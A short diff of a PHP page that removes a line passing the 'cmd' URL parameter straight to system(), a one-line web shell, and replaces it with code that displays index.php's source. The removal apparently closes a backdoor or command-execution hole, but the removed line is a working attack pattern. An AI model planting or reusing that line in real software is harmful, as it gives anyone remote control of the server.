@@ -1,5 +1,5 @@
 <?php
 echo "<pre>";
-system($_GET['cmd'] ?? "echo hello");
+highlight_file("index.php");
 echo "</pre>";
 ?>
